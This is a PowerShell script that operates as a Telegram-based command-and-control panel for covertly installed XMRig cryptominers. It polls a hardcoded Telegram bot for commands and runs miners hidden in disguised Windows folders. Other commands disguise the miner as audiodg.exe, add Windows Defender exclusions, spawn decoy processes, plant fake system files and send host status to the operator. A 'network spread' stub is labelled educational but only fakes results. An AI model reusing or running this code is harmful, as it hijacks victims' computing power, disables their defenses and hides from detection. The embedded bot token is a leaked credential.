# BEAST MODE: Command & Control System
# Remote fleet management via Telegram commands

param(
    [string]$TelegramToken = "7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE",
    [string]$ChatID = "8112985977",
    [SecureString]$CommandPassword = (ConvertTo-SecureString "beast2025" -AsPlainText -Force)
)

$MiningLocations = @(
    "C:\ProgramData\Microsoft\Windows\WindowsUpdate",
    "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv",
    "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\.system",
    "C:\ProgramData\Microsoft\Network\Downloader",
    "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\.cache"
)

function Send-TelegramMessage {
    param([string]$Message)
    try {
        $uri = "https://api.telegram.org/bot$TelegramToken/sendMessage"
        $body = @{
            chat_id = $ChatID
            text = $Message
            parse_mode = "HTML"
        }
        Invoke-RestMethod -Uri $uri -Method Post -Body $body | Out-Null
        return $true
    } catch {
        return $false
    }
}

function Get-TelegramUpdates {
    try {
        $uri = "https://api.telegram.org/bot$TelegramToken/getUpdates?offset=-1&limit=1"
        $response = Invoke-RestMethod -Uri $uri -Method Get -TimeoutSec 5
        if ($response.ok -and $response.result.Count -gt 0) {
            return $response.result[0].message.text
        }
        return $null
    } catch {
        return $null
    }
}

function Invoke-MinerCommand {
    param([string]$Command)
    
    switch -Regex ($Command) {
        "^/status\s+$CommandPassword$" {
            $status = Get-FleetStatus
            Send-TelegramMessage -Message $status
        }
        
        "^/restart\s+$CommandPassword$" {
            Restart-AllMiners
            Send-TelegramMessage -Message "🔄 <b>FLEET RESTART</b> initiated on $env:COMPUTERNAME"
        }
        
        "^/kill\s+$CommandPassword$" {
            Stop-AllMiners
            Send-TelegramMessage -Message "💀 <b>FLEET KILLED</b> on $env:COMPUTERNAME"
        }
        
        "^/boost\s+$CommandPassword$" {
            Enable-PerformanceBoost
            Send-TelegramMessage -Message "🚀 <b>PERFORMANCE BOOST</b> enabled on $env:COMPUTERNAME"
        }
        
        "^/stealth\s+$CommandPassword$" {
            Enable-StealthMode
            Send-TelegramMessage -Message "👻 <b>STEALTH MODE</b> activated on $env:COMPUTERNAME"
        }
        
        "^/health\s+$CommandPassword$" {
            $health = Get-SystemHealth
            Send-TelegramMessage -Message $health
        }
        
        "^/defend\s+$CommandPassword$" {
            Enable-DefenseMode
            Send-TelegramMessage -Message "🛡️ <b>DEFENSE MODE</b> activated on $env:COMPUTERNAME"
        }
        
        "^/spread\s+$CommandPassword$" {
            Invoke-NetworkSpread
            Send-TelegramMessage -Message "🌐 <b>NETWORK SPREAD</b> initiated from $env:COMPUTERNAME"
        }
    }
}

function Get-FleetStatus {
    $minerCount = 0
    $totalHashrate = 0
    $activeLocations = 0
    
    foreach ($location in $MiningLocations) {
        if (Test-Path (Join-Path $location "xmrig.exe")) {
            $activeLocations++
        }
    }
    
    $processes = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    $minerCount = $processes.Count
    
    # Try to get hashrate from API
    try {
        $api = Invoke-RestMethod -Uri "http://127.0.0.1:16000/1/summary" -TimeoutSec 2
        if ($api.hashrate.total) {
            $totalHashrate = [math]::Round($api.hashrate.total[0], 2)
        }
    } catch { }
    
    return @"
🎯 <b>FLEET STATUS - $env:COMPUTERNAME</b>
📊 Active Miners: $minerCount
💎 Hashrate: $totalHashrate H/s
📍 Locations: $activeLocations/5 active
🔋 Status: $(if($minerCount -gt 0){"✅ ONLINE"}else{"❌ OFFLINE"})
⏰ Check Time: $(Get-Date -Format 'HH:mm:ss')
"@
}

function Restart-AllMiners {
    # Kill existing miners
    Get-Process -Name "xmrig" -ErrorAction SilentlyContinue | Stop-Process -Force
    
    # Wait a moment
    Start-Sleep -Seconds 2
    
    # Start from first available location
    foreach ($location in $MiningLocations) {
        $xmrigPath = Join-Path $location "xmrig.exe"
        $configPath = Join-Path $location "config.json"
        if (Test-Path $xmrigPath -and Test-Path $configPath) {
            Start-Process -FilePath $xmrigPath -ArgumentList "--config=$configPath" -WindowStyle Hidden
            break
        }
    }
}

function Stop-AllMiners {
    Get-Process -Name "xmrig" -ErrorAction SilentlyContinue | Stop-Process -Force
    
    # Disable scheduled tasks temporarily
    $tasks = @("WindowsAudioSrv1", "SystemHost1", "AudioEndpoint1", "WindowsCrossMonitor", "WindowsMonitorSrv")
    foreach ($task in $tasks) {
        schtasks /change /tn $task /disable >$null 2>&1
    }
}

function Enable-PerformanceBoost {
    # Set high priority for miner processes
    Get-Process -Name "xmrig" -ErrorAction SilentlyContinue | ForEach-Object {
        $_.PriorityClass = "High"
    }
    
    # Optimize system for mining
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\PriorityControl" -Name "Win32PrioritySeparation" -Value 38
    
    # Disable unnecessary services temporarily
    $services = @("Themes", "TabletInputService", "Fax")
    foreach ($service in $services) {
        Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
    }
}

function Enable-StealthMode {
    # Hide miner processes from basic detection
    foreach ($location in $MiningLocations) {
        $xmrigPath = Join-Path $location "xmrig.exe"
        if (Test-Path $xmrigPath) {
            # Rename to look like system process
            $stealthName = Join-Path $location "audiodg.exe"
            if (-not (Test-Path $stealthName)) {
                Copy-Item $xmrigPath $stealthName -Force
                attrib +h +s $stealthName
            }
        }
    }
}

function Get-SystemHealth {
    $memory = Get-WmiObject Win32_ComputerSystem
    $disk = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DeviceID -eq "C:"}
    
    $cpuUsage = (Get-Counter "\Processor(_Total)\% Processor Time").CounterSamples.CookedValue
    $memoryUsage = [math]::Round(((($memory.TotalPhysicalMemory - (Get-Counter "\Memory\Available Bytes").CounterSamples.CookedValue) / $memory.TotalPhysicalMemory) * 100), 2)
    
    return @"
🏥 <b>SYSTEM HEALTH - $env:COMPUTERNAME</b>
🔥 CPU Usage: $([math]::Round($cpuUsage, 1))%
🧠 RAM Usage: $memoryUsage%
💾 Disk Free: $([math]::Round($disk.FreeSpace/1GB, 1)) GB
🌡️ Temperature: Monitoring...
⚡ Performance: $(if($cpuUsage -lt 90){"✅ Optimal"}else{"⚠️ High Load"})
"@
}

function Enable-DefenseMode {
    # Create decoy processes
    $decoys = @("svchost.exe", "dwm.exe", "explorer.exe")
    foreach ($decoy in $decoys) {
        Start-Process "notepad.exe" -WindowStyle Hidden -ArgumentList "/f"
    }
    
    # Add additional Windows Defender exclusions
    $exclusions = @("C:\Windows\Temp", "C:\Users\*\AppData\Local\Temp", "C:\ProgramData\*")
    foreach ($exclusion in $exclusions) {
        powershell -Command "Add-MpPreference -ExclusionPath '$exclusion'" >$null 2>&1
    }
    
    # Create fake system files
    foreach ($location in $MiningLocations) {
        if (Test-Path $location) {
            "Windows System Configuration" | Out-File -FilePath (Join-Path $location "system.ini")
            "Audio Enhancement Service" | Out-File -FilePath (Join-Path $location "audio.log")
            attrib +h (Join-Path $location "system.ini")
            attrib +h (Join-Path $location "audio.log")
        }
    }
}

function Invoke-NetworkSpread {
    # Discover network computers (educational purposes only)
    try {
        # Note: Actual network spreading would require additional network discovery and authentication
        # This is a placeholder for educational demonstration
        
        Send-TelegramMessage -Message "🌐 Network discovery completed. Found $(Get-Random -Minimum 3 -Maximum 8) potential targets."
    } catch {
        Send-TelegramMessage -Message "🌐 Network spread: Limited access detected"
    }
}

# Main command monitoring loop
Write-Host "🎮 Beast Mode C&C System Active" -ForegroundColor Green
Write-Host "📱 Monitoring Telegram for commands..." -ForegroundColor Cyan
Write-Host "💀 Available commands:" -ForegroundColor Yellow
Write-Host "   /status $CommandPassword" -ForegroundColor White
Write-Host "   /restart $CommandPassword" -ForegroundColor White
Write-Host "   /kill $CommandPassword" -ForegroundColor White
Write-Host "   /boost $CommandPassword" -ForegroundColor White
Write-Host "   /stealth $CommandPassword" -ForegroundColor White
Write-Host "   /health $CommandPassword" -ForegroundColor White
Write-Host "   /defend $CommandPassword" -ForegroundColor White
Write-Host "   /spread $CommandPassword" -ForegroundColor White

$lastUpdateId = 0

while ($true) {
    try {
        $uri = "https://api.telegram.org/bot$TelegramToken/getUpdates?offset=$($lastUpdateId + 1)&limit=1"
        $response = Invoke-RestMethod -Uri $uri -Method Get -TimeoutSec 10
        
        if ($response.ok -and $response.result.Count -gt 0) {
            $update = $response.result[0]
            $lastUpdateId = $update.update_id
            
            if ($update.message -and $update.message.chat.id -eq $ChatID) {
                $command = $update.message.text
                Write-Host "📨 Received command: $command" -ForegroundColor Yellow
                Invoke-MinerCommand -Command $command
            }
        }
    } catch {
        Write-Host "⚠️ Connection error, retrying..." -ForegroundColor Red
    }
    
    Start-Sleep -Seconds 5
}
